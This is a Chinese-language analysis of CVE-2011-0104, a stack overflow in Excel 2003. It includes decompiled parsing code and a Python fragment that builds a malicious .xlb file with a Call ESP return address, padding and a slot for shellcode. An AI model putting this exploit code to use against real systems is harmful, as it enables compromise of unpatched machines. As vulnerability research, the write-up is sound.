{"title": "CVE-2011-0104\u5206\u6790", "tags": "Exploit StackOverFlow", "content": "### \u73af\u5883\r\n\u53d7\u5f71\u54cd\u8f6f\u4ef6: Office Excel 2003 (11.8324.8324) SP3\r\n\r\n### \u5206\u6790\r\n\r\n\u4e3b\u7a0b\u5e8f\u6ca1\u6709\u542f\u7528DEP ASLR Stack cookie\uff0c\u6240\u4ee5\u76f4\u63a5\u8986\u76d6\u8fd4\u56de\u5730\u5740\u5c31\u884c\u4e86\r\n\r\n\u8fd9\u91cc\u6211\u7528\u76842003\uff0c\u6709\u4e9b\u6570\u636e\u8ddf\u516c\u5e03\u7684POC\u4e0d\u4e00\u6837\uff0c\u540e\u9762\u4f1a\u8bf4\r\n\r\nWindbg\u8f7d\u5165\u7a0b\u5e8f\uff0c\u52a0\u8f7dEXP\u6587\u4ef6\uff0c\u5d29\u6e83\u540e\u6253\u5f00IDA\u7f51\u4e0a\u627e \u627e\u5230\u6765\u6e90\r\n```c\r\n     else if ( recordType == 167 )             // A7 type\r\n      {\r\n      3070EEB7:        \r\n        field2_dword = &buf[recordLength];\r\n        v11 = dword_308942E4 < 5;\r\n        LOBYTE(v11) = dword_308942E4 >= 5;\r\n        len = &buf[recordLength];\r\n```\r\n##### \u8fd9\u91cc\u8ddf\u7740EXP\u91cc\u7684\u6570\u636e\u627e\uff0c\u5f88\u5bb9\u6613\u5b9a\u4f4d\u5230\uff0c\u5f80\u4e0b\u627e\u5230\u6709\u95ee\u9898\u7684\u51fd\u6570\r\n```c\r\n            if ( HIWORD(ret_addr) & 0x12F && buf2 >= len )\r\n            {\r\n              recordType = read_buf();\r\n              if ( recordType != 0x3C )         // field4\r\n                goto LABEL_184;                 // \u7ed3\u675f\u6807\u5fd7\r\n              filed5 = read_buf();\r\n              v18 = elementSize * field2;\r\n              len = filed5;\r\n              buf2 = buf_1 + elementSize * field2 + 3;\r\n              v19 = get_gbuf_size();\r\n              read_buf_len(v5, buf2, len, -3u - v18 + v19);// \u95ee\u9898\u590d\u5236\u5185\u5b58\u51fd\u6570\r\n```\r\n\r\n\u4e3a\u4e86\u641e\u6e05\u695a\uff0c\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u6211\u6839\u636eOD\u7684RUNTRACE\u5f97\u5230\u4e0b\u56fe\r\n{style=\"height:500px;\"}![data/flow.png](data/cve-2011-0104/flow.png)\r\n\u53ef\u4ee5\u65b9\u4fbf\u7684\u770b\u5230\u89e3\u6790\u6570\u636e\u7684\u6267\u884c\u6d41\u7a0b\r\n\r\n\u4e0e\u516c\u5171POC\u4e0d\u540c\u7684\u5730\u65b9\uff1a\r\n```python\r\n\t\trecordType = b\"\\xA7\\x00\"\t#\u5b9a\u503c\r\n\t\trecordLenght = b\"\\x04\\x00\"\r\n\t\tfield1 = b\"\\x00\" #\u4e0d\u91cd\u8981\r\n\t\tfield2 = b\"\\x28\\x0C\" #\u8ba1\u7b97BUFFER\u5730\u5740\r\n\t\tfield3 = b\"\\x00\"     #\u4e0d\u91cd\u8981\r\n\t\tfield4 = b\"\\x3C\\x00\" #\u5b9a\u503c\r\n\t\tfield5 = b\"\\x00\\x03\" #\u8bfb\u53d6\u957f\u5ea6\r\n\r\n        eip = b\"\\x53\\x52\\x11\\x30\"    # Call ESP\r\n\r\n\t\tfdW = open('exploit2003.xlb', 'wb+')\r\n\t\tfdW.write(str1)\r\n\t\tfdW.write(record)    \r\n\t\tfdW.write(b\"\\x41\")     # padding\r\n\t\tfdW.write(eip)\t\t\t\t\r\n\t\t#fdW.write(\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\")      # bypassing a conditional\r\n\t\tfdW.write(b\"\\x41\"*0x24+b\"\\xF8\\xFF\\x89\\x30\"+b\"\\x41\"*(0x2c-0x24-4))     # padding return 2c, addr must writeable\t\t\r\n\t\tfdW.write(shellcode)\r\n```\r\n\r\n\u8fd9\u91cc\u7b2c\u4e8c\u6b21retn 0x2c\u624d\u80fd\u63a7\u5236EIP\uff0c\u6240\u4ee5\u586b\u5145\u4e00\u4e9b\u5b57\u8282,\u5176\u4e2d\u4e00\u4e2a\u7279\u6b8a\u503c\u662f\u56e0\u4e3a\u8fd4\u56de\u524d\u6709mov dword ptr [addr], imm32,\u6240\u4ee5\u8981\u4e00\u4e2a\u5730\u5740\u4fdd\u8bc1\u53ef\u5199"}